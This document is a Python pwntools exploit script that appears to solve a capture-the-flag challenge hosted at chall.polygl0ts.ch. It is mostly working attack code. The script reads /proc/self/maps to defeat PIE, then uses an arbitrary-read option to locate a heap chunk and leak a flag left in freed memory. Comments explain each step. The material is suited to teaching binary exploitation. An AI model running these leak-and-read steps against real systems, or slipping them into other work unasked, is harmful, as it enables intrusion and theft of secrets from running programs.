#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 5000 ./capture_the_flaaaaaaaaaaaaag
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './capture_the_flaaaaaaaaaaaaag')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.polygl0ts.ch'
port = int(args.PORT or 9003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# the first thing to realize is that because of buffering, fread() will write the whole flag into the heap and not just the first character
# the buffer containing the flag will be freed when calling fclose, and consolidated with the top chunk

# getline() will first malloc(0x80), cutting a chunk from the top where the flag is
# its address is then stored in the global variable feedback
# you need to do this step first so that when opening /proc/self/maps it won't overwrite the flag in the heap
io.sendlineafter(b'> ',b'3')
io.sendlineafter(b'> ',b'')

# pie leak by reading the first few bytes of /proc/self/maps
io.sendlineafter(b'> ',b'1')
io.sendlineafter(b'> ',b'/proc/self/maps')
exe.address = int(io.recvline().split(b'-')[0],16)
log.info(f"pie: 0x{exe.address:x}")

# leaking the address of the feedback chunk
io.sendlineafter(b'> ',b'2')
io.sendlineafter(b'> ',hex(exe.symbols.feedback).encode())
heap_ptr = unpack(io.recvline()[:-1],'all')
log.info(f"feedback at: 0x{heap_ptr:x}")

# leaking the flag
io.sendlineafter(b'> ',b'2')
io.sendlineafter(b'> ',hex(heap_ptr+2).encode()) # there's a null byte at position 1, from giving feedback, hence the +2
log.info("EP" + io.recvline().decode())
io.close()
